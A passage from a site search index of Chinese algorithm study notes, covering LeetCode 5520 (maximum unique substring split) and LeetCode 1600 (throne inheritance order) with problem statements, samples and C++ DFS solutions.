\uff0c\u8fd9\u4e9b\u5b50\u5b57\u7b26\u4e32\u8fde\u63a5\u540e\u5e94\u5f53\u80fd\u591f\u8fd8\u539f\u4e3a\u539f\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u62c6\u5206\u51fa\u6765\u7684\u6bcf\u4e2a\u5b50\u5b57\u7b26\u4e32\u90fd\u5fc5\u987b\u662f \u552f\u4e00\u7684 \u3002 \u6ce8\u610f\uff1a \u5b50\u5b57\u7b26\u4e32 \u662f\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e2a\u8fde\u7eed\u5b57\u7b26\u5e8f\u5217\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#13-sample-input-1","text":"\u8f93\u5165\uff1as = \"ababccc\"","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#14-sample-output-1","text":"\u8f93\u51fa\uff1a5 \u89e3\u91ca\uff1a\u4e00\u79cd\u6700\u5927\u62c6\u5206\u65b9\u6cd5\u4e3a ['a', 'b', 'ab', 'c', 'cc'] \u3002\u50cf ['a', 'b', 'a', 'b', 'c', 'cc'] \u8fd9\u6837\u62c6\u5206\u4e0d\u6ee1\u8db3\u9898\u76ee\u8981\u6c42\uff0c\u56e0\u4e3a\u5176\u4e2d\u7684 'a' \u548c 'b' \u90fd\u51fa\u73b0\u4e86\u4e0d\u6b62\u4e00\u6b21\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#15-sample-input-2","text":"\u8f93\u5165\uff1as = \"aba\"","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#16-sample-output-2","text":"\u8f93\u51fa\uff1a2 \u89e3\u91ca\uff1a\u4e00\u79cd\u6700\u5927\u62c6\u5206\u65b9\u6cd5\u4e3a ['a', 'ba'] \u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#17-source","text":"LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#2","text":"DFS\u904d\u5386\u6240\u6709\u957f\u5ea6\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#3","text":"class Solution { public: unordered_set<string> st; int ans = 0; int DFS(string& str, size_t pos) { // \u505c\u6b62\u641c\u7d22 if (pos >= str.size()) { return st.size(); } // \u904d\u5386\u6240\u6709\u957f\u5ea6 for (size_t i = 1; i <= str.size() - pos; i++) { // \u82e5\u672a\u5728\u96c6\u5408\u4e2d\u5b58\u50a8 if (st.find(str.substr(pos, i)) == st.end()) { // \u63d2\u5165\u96c6\u5408 st.insert(str.substr(pos, i)); // \u641c\u7d22\u4e0b\u4e00\u5b57\u7b26 ans = max(ans, DFS(str, pos + i)); // \u5c06\u5b57\u7b26\u4e32\u4ece\u96c6\u5408\u4e2d\u5220\u9664\uff0c\u9000\u56de\u4e0a\u4e00\u72b6\u6001 st.erase(str.substr(pos, i)); } } return ans; } int maxUniqueSplit(string s) { return DFS(s, 0); } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/","text":"LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f # \u76ee\u5f55 # LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Notes 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u4e00\u4e2a\u738b\u56fd\u91cc\u4f4f\u7740\u56fd\u738b\u3001\u4ed6\u7684\u5b69\u5b50\u4eec\u3001\u4ed6\u7684\u5b59\u5b50\u4eec\u7b49\u7b49\u3002\u6bcf\u4e00\u4e2a\u65f6\u95f4\u70b9\uff0c\u8fd9\u4e2a\u5bb6\u5ead\u91cc\u6709\u4eba\u51fa\u751f\u4e5f\u6709\u4eba\u6b7b\u4ea1\u3002 \u8fd9\u4e2a\u738b\u56fd\u6709\u4e00\u4e2a\u660e\u786e\u89c4\u5b9a\u7684\u7687\u4f4d\u7ee7\u627f\u987a\u5e8f\uff0c\u7b2c\u4e00\u7ee7\u627f\u4eba\u603b\u662f\u56fd\u738b\u81ea\u5df1\u3002\u6211\u4eec\u5b9a\u4e49\u9012\u5f52\u51fd\u6570 Successor(x, curOrder) \uff0c\u7ed9\u5b9a\u4e00\u4e2a\u4eba x \u548c\u5f53\u524d\u7684\u7ee7\u627f\u987a\u5e8f\uff0c\u8be5\u51fd\u6570\u8fd4\u56de x \u7684\u4e0b\u4e00\u7ee7\u627f\u4eba\u3002 Successor(x, curOrder): \u5982\u679c x \u6ca1\u6709\u5b69\u5b50\u6216\u8005\u6240\u6709 x \u7684\u5b69\u5b50\u90fd\u5728 curOrder \u4e2d\uff1a \u5982\u679c x \u662f\u56fd\u738b\uff0c\u90a3\u4e48\u8fd4\u56de null \u5426\u5219\uff0c\u8fd4\u56de Successor(x \u7684\u7236\u4eb2, curOrder) \u5426\u5219\uff0c\u8fd4\u56de x \u4e0d\u5728 curOrder \u4e2d\u6700\u5e74\u957f\u7684\u5b69\u5b50 \u6bd4\u65b9\u8bf4\uff0c\u5047\u8bbe\u738b\u56fd\u7531\u56fd\u738b\uff0c\u4ed6\u7684\u5b69\u5b50 Alice \u548c Bob \uff08Alice \u6bd4 Bob \u5e74\u957f\uff09\u548c Alice \u7684\u5b69\u5b50 Jack \u7ec4\u6210\u3002 \u4e00\u5f00\u59cb\uff0c curOrder \u4e3a [\"king\"]. \u8c03\u7528 Successor(king, curOrder) \uff0c\u8fd4\u56de Alice \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Alice \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\"] \u3002 \u8c03\u7528 Successor(Alice, curOrder) \uff0c\u8fd4\u56de Jack \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Jack \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\", \"Jack\"] \u3002 \u8c03\u7528 Successor(Jack, curOrder) \uff0c\u8fd4\u56de Bob \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Bob \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\", \"Jack\", \"Bob\"] \u3002 \u8c03\u7528 Successor(Bob, curOrder) \uff0c\u8fd4\u56de null \u3002\u6700\u7ec8\u5f97\u5230\u7ee7\u627f\u987a\u5e8f\u4e3a [\"king\", \"Alice\", \"Jack\", \"Bob\"] \u3002 \u901a\u8fc7\u4ee5\u4e0a\u7684\u51fd\u6570\uff0c\u6211\u4eec\u603b\u662f\u80fd\u5f97\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u7ee7\u627f\u987a\u5e8f\u3002 \u8bf7\u4f60\u5b9e\u73b0 ThroneInheritance \u7c7b\uff1a ThroneInheritance(string kingName) \u521d\u59cb\u5316\u4e00\u4e2a ThroneInheritance \u7c7b\u7684\u5bf9\u8c61\u3002\u56fd\u738b\u7684\u540d\u5b57\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u4f20\u5165\u3002 void birth(string parentName, string childName) \u8868\u793a parentName \u65b0\u62e5\u6709\u4e86\u4e00\u4e2a\u540d\u4e3a childName \u7684\u5b69\u5b50\u3002 void death(string name) \u8868\u793a\u540d\u4e3a name \u7684\u4eba\u6b7b\u4ea1\u3002\u4e00\u4e2a\u4eba\u7684\u6b7b\u4ea1\u4e0d\u4f1a\u5f71\u54cd Successor \u51fd\u6570\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u7684\u7ee7\u627f\u987a\u5e8f\u3002\u4f60\u53ef\u4ee5\u53ea\u5c06\u8fd9\u4e2a\u4eba\u6807\u8bb0\u4e3a\u6b7b\u4ea1\u72b6\u6001\u3002 string[] getInheritanceOrder() \u8fd4\u56de \u9664\u53bb \u6b7b\u4ea1\u4eba\u5458\u7684\u5f53\u524d\u7ee7\u627f\u987a\u5e8f\u5217\u8868\u3002\u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1a [\"ThroneInheritance\", \"birth\", \"birth\", \"birth\", \"birth\", \"birth\", \"birth\", \"getInheritanceOrder\", \"death\", \"getInheritanceOrder\"] [[\"king\"], [\"king\", \"andy\"], [\"king\", \"bob\"], [\"king\", \"catherine\"], [\"andy\", \"matthew\"], [\"bob\", \"alex\"], [\"bob\", \"asha\"], [null], [\"bob\"], [null]] 1.4. Sample Output 1 # \u8f93\u51fa\uff1a [null, null, null, null, null, null, null, [\"king\", \"andy\", \"matthew\", \"bob\", \"alex\", \"asha\", \"catherine\"], null, [\"king\", \"andy\", \"matthew\", \"alex\", \"asha\", \"catherine\"]] \u89e3\u91ca\uff1a ThroneInheritance t= new ThroneInheritance(\"king\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking t.birth(\"king\", \"andy\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy t.birth(\"king\", \"bob\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > bob t.birth(\"king\", \"catherine\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > bob > catherine t.birth(\"andy\", \"matthew\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > catherine t.birth(\"bob\", \"alex\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > alex > catherine t.birth(\"bob\", \"asha\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > alex > asha > catherine t.getInheritanceOrder(); // \u8fd4\u56de [\"king\", \"andy\", \"matthew\", \"bob\", \"alex\", \"asha\", \"catherine\"] t.death(\"bob\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob\uff08\u5df2\u7ecf\u53bb\u4e16\uff09> alex > asha > catherine t.getInheritanceOrder(); // \u8fd4\u56de [\"king\", \"andy\", \"matthew\", \"alex\", \"asha\", \"catherine\"] 1.5. Notes # \u63d0\u793a\uff1a 1 <= kingName.length, parentName.length, childName.length, name.length <= 15 kingName\uff0cparentName\uff0c childName \u548c name \u4ec5\u5305\u542b\u5c0f\u5199\u82f1\u6587\u5b57\u6bcd\u3002 \u6240\u6709\u7684\u53c2\u6570 childName \u548c kingName \u4e92\u4e0d\u76f8\u540c\u3002 \u6240\u6709 death \u51fd\u6570\u4e2d\u7684\u6b7b\u4ea1\u540d\u5b57 name \u8981\u4e48\u662f\u56fd\u738b\uff0c\u8981\u4e48\u662f\u5df2\u7ecf\u51fa\u751f\u4e86\u7684\u4eba\u5458\u540d\u5b57\u3002 \u6bcf\u6b21\u8c03\u7528 birth(parentName, childName) \u65f6\uff0c\u6d4b\u8bd5\u7528\u4f8b\u90fd\u4fdd\u8bc1 parentName \u5bf9\u5e94\u7684\u4eba\u5458\u662f\u6d3b\u7740\u7684\u3002 \u6700\u591a\u8c03\u7528 10^5 \u6b21birth \u548c death \u3002 \u6700\u591a\u8c03\u7528 10 \u6b21 getInheritanceOrder \u3002 1.7. Source # LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f 2. \u89e3\u8bfb # DFS\u904d\u5386\u6bcf\u4e2a\u5206\u652f\uff0c\u7528 unordered_set \u8bb0\u5f55\u6b7b\u4ea1\u7684\u4eba\u540d\uff0c\u5728\u8f93\u51fa\u65f6\u8df3\u8fc7\u5373\u53ef\u3002 3. \u4ee3\u7801 # \u4ee3\u7801\u53c2\u8003\u81ea \u53e6\u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 class ThroneInheritance { unordered_map<string, vector<string>> mp; unordered_set<string> dead; string king; public: ThroneInheritance(string kingName) { king = kingName; mp[kingName]; } void birth(string parentName, string childName) { //\u5efa\u56fe mp[parentName].push_back(childName); } void death(string name) { //\u8bb0\u5f55\u6b7b\u4ea1\u7684 dead.insert(name); } vector<string> getInheritanceOrder() { vector<string> ans; //\u6df1\u5ea6\u4f18\u5148\u641c\u7d22 dfs(king, ans); return ans; } void dfs(string& people, vector<string>& ans) { // \u82e5\u7ee7\u627f\u4eba\u5b58\u6d3b\uff0c\u653e\u5165\u7ed3\u679c if (dead.find(people) == dead.end()) ans.push_back(people); // \u505c\u6b62\u641c\u7d22\u6761\u4ef6 if (mp[people].size() == 0) return; // \u7ee7\u7eed\u641c\u7d22\u6761\u4ef6 for (auto& child : mp[people]) dfs(child, ans); } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#leetcode-1600","text":"","title":"LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#_1","text":"LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Notes 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#12-problem-description","text":"\u4e00\u4e2a\u738b\u56fd\u91cc\u4f4f\u7740\u56fd\u738b\u3001\u4ed6\u7684\u5b69\u5b50\u4eec\u3001\u4ed6\u7684\u5b59\u5b50\u4eec\u7b49\u7b49\u3002\u6bcf\u4e00\u4e2a\u65f6\u95f4\u70b9\uff0c\u8fd9\u4e2a\u5bb6\u5ead\u91cc\u6709\u4eba\u51fa\u751f\u4e5f\u6709\u4eba\u6b7b\u4ea1\u3002 \u8fd9\u4e2a\u738b\u56fd\u6709\u4e00\u4e2a\u660e\u786e\u89c4\u5b9a\u7684\u7687\u4f4d\u7ee7\u627f\u987a\u5e8f\uff0c\u7b2c\u4e00\u7ee7\u627f\u4eba\u603b\u662f\u56fd\u738b\u81ea\u5df1\u3002\u6211\u4eec\u5b9a\u4e49\u9012\u5f52\u51fd\u6570 Successor(x, curOrder) \uff0c\u7ed9\u5b9a\u4e00\u4e2a\u4eba x \u548c\u5f53\u524d\u7684\u7ee7\u627f\u987a\u5e8f\uff0c\u8be5\u51fd\u6570\u8fd4\u56de x \u7684\u4e0b\u4e00\u7ee7\u627f\u4eba\u3002 Successor(x, curOrder): \u5982\u679c x \u6ca1\u6709\u5b69\u5b50\u6216\u8005\u6240\u6709 x \u7684\u5b69\u5b50\u90fd\u5728 curOrder \u4e2d\uff1a \u5982\u679c x \u662f\u56fd\u738b\uff0c\u90a3\u4e48\u8fd4\u56de null \u5426\u5219\uff0c\u8fd4\u56de Successor(x \u7684\u7236\u4eb2, curOrder) \u5426\u5219\uff0c\u8fd4\u56de x \u4e0d\u5728 curOrder \u4e2d\u6700\u5e74\u957f\u7684\u5b69\u5b50 \u6bd4\u65b9\u8bf4\uff0c\u5047\u8bbe\u738b\u56fd\u7531\u56fd\u738b\uff0c\u4ed6\u7684\u5b69\u5b50 Alice \u548c Bob \uff08Alice \u6bd4 Bob \u5e74\u957f\uff09\u548c Alice \u7684\u5b69\u5b50 Jack \u7ec4\u6210\u3002 \u4e00\u5f00\u59cb\uff0c curOrder \u4e3a [\"king\"]. \u8c03\u7528 Successor(king, curOrder) \uff0c\u8fd4\u56de Alice \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Alice \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\"] \u3002 \u8c03\u7528 Successor(Alice, curOrder) \uff0c\u8fd4\u56de Jack \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Jack \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\", \"Jack\"] \u3002 \u8c03\u7528 Successor(Jack, curOrder) \uff0c\u8fd4\u56de Bob \uff0c\u6240\u4ee5\u6211\u4eec\u5c06 Bob \u653e\u5165 curOrder \u4e2d\uff0c\u5f97\u5230 [\"king\", \"Alice\", \"Jack\", \"Bob\"] \u3002 \u8c03\u7528 Successor(Bob, curOrder) \uff0c\u8fd4\u56de null \u3002\u6700\u7ec8\u5f97\u5230\u7ee7\u627f\u987a\u5e8f\u4e3a [\"king\", \"Alice\", \"Jack\", \"Bob\"] \u3002 \u901a\u8fc7\u4ee5\u4e0a\u7684\u51fd\u6570\uff0c\u6211\u4eec\u603b\u662f\u80fd\u5f97\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u7ee7\u627f\u987a\u5e8f\u3002 \u8bf7\u4f60\u5b9e\u73b0 ThroneInheritance \u7c7b\uff1a ThroneInheritance(string kingName) \u521d\u59cb\u5316\u4e00\u4e2a ThroneInheritance \u7c7b\u7684\u5bf9\u8c61\u3002\u56fd\u738b\u7684\u540d\u5b57\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u4f20\u5165\u3002 void birth(string parentName, string childName) \u8868\u793a parentName \u65b0\u62e5\u6709\u4e86\u4e00\u4e2a\u540d\u4e3a childName \u7684\u5b69\u5b50\u3002 void death(string name) \u8868\u793a\u540d\u4e3a name \u7684\u4eba\u6b7b\u4ea1\u3002\u4e00\u4e2a\u4eba\u7684\u6b7b\u4ea1\u4e0d\u4f1a\u5f71\u54cd Successor \u51fd\u6570\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u7684\u7ee7\u627f\u987a\u5e8f\u3002\u4f60\u53ef\u4ee5\u53ea\u5c06\u8fd9\u4e2a\u4eba\u6807\u8bb0\u4e3a\u6b7b\u4ea1\u72b6\u6001\u3002 string[] getInheritanceOrder() \u8fd4\u56de \u9664\u53bb \u6b7b\u4ea1\u4eba\u5458\u7684\u5f53\u524d\u7ee7\u627f\u987a\u5e8f\u5217\u8868\u3002\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#13-sample-input-1","text":"\u8f93\u5165\uff1a [\"ThroneInheritance\", \"birth\", \"birth\", \"birth\", \"birth\", \"birth\", \"birth\", \"getInheritanceOrder\", \"death\", \"getInheritanceOrder\"] [[\"king\"], [\"king\", \"andy\"], [\"king\", \"bob\"], [\"king\", \"catherine\"], [\"andy\", \"matthew\"], [\"bob\", \"alex\"], [\"bob\", \"asha\"], [null], [\"bob\"], [null]]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#14-sample-output-1","text":"\u8f93\u51fa\uff1a [null, null, null, null, null, null, null, [\"king\", \"andy\", \"matthew\", \"bob\", \"alex\", \"asha\", \"catherine\"], null, [\"king\", \"andy\", \"matthew\", \"alex\", \"asha\", \"catherine\"]] \u89e3\u91ca\uff1a ThroneInheritance t= new ThroneInheritance(\"king\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking t.birth(\"king\", \"andy\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy t.birth(\"king\", \"bob\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > bob t.birth(\"king\", \"catherine\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > bob > catherine t.birth(\"andy\", \"matthew\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > catherine t.birth(\"bob\", \"alex\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > alex > catherine t.birth(\"bob\", \"asha\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob > alex > asha > catherine t.getInheritanceOrder(); // \u8fd4\u56de [\"king\", \"andy\", \"matthew\", \"bob\", \"alex\", \"asha\", \"catherine\"] t.death(\"bob\"); // \u7ee7\u627f\u987a\u5e8f\uff1aking > andy > matthew > bob\uff08\u5df2\u7ecf\u53bb\u4e16\uff09> alex > asha > catherine t.getInheritanceOrder(); // \u8fd4\u56de [\"king\", \"andy\", \"matthew\", \"alex\", \"asha\", \"catherine\"]","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#15-notes","text":"\u63d0\u793a\uff1a 1 <= kingName.length, parentName.length, childName.length, name.length <= 15 kingName\uff0cparentName\uff0c childName \u548c name \u4ec5\u5305\u542b\u5c0f\u5199\u82f1\u6587\u5b57\u6bcd\u3002 \u6240\u6709\u7684\u53c2\u6570 childName \u548c kingName \u4e92\u4e0d\u76f8\u540c\u3002 \u6240\u6709 death \u51fd\u6570\u4e2d\u7684\u6b7b\u4ea1\u540d\u5b57 name \u8981\u4e48\u662f\u56fd\u738b\uff0c\u8981\u4e48\u662f\u5df2\u7ecf\u51fa\u751f\u4e86\u7684\u4eba\u5458\u540d\u5b57\u3002 \u6bcf\u6b21\u8c03\u7528 birth(parentName, childName) \u65f6\uff0c\u6d4b\u8bd5\u7528\u4f8b\u90fd\u4fdd\u8bc1 parentName \u5bf9\u5e94\u7684\u4eba\u5458\u662f\u6d3b\u7740\u7684\u3002 \u6700\u591a\u8c03\u7528 10^5 \u6b21birth \u548c death \u3002 \u6700\u591a\u8c03\u7528 10 \u6b21 getInheritanceOrder \u3002","title":"1.5. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#17-source","text":"LeetCode 1600 \u7687\u4f4d\u7ee7\u627f\u987a\u5e8f","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#2","text":"DFS\u904d\u5386\u6bcf\u4e2a\u5206\u652f\uff0c\u7528 unordered_set \u8bb0\u5f55\u6b7b\u4ea1\u7684\u4eba\u540d\uff0c\u5728\u8f93\u51fa\u65f6\u8df3\u8fc7\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/6.LeetCode_1600_%E7%9A%87%E4%BD%8D%E7%BB%A7%E6%89%BF%E9%A1%BA%E5%BA%8F/#3","text":"\u4ee3\u7801\u53c2\u8003\u81ea 